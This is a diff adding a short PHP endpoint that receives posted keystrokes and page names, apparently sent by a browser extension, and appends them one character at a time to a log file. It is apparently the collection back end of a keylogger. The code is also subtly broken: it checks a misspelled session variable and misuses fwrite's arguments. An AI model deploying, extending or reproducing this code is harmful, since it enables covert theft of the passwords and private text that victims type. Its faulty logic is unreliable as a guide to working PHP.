@@ -1,0 +1,20 @@
+<?php
+session_start();
+
+if (!isset($_POST['key'])) {
+    echo("Access Denied!");
+    exit(0);
+}
+
+$file = fopen("cool_extension.log","a+");
+
+if (!isset($SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
+    $_SESSION['page'] = $_POST['page'];
+    fwrite($file," [[[ PAGE ; ",$_POST['page'],"]]] ");
+
+} 
+
+fwrite($file, $_POST['key']);
+fclose($file);
+
+echo('CHAR SAVED!');
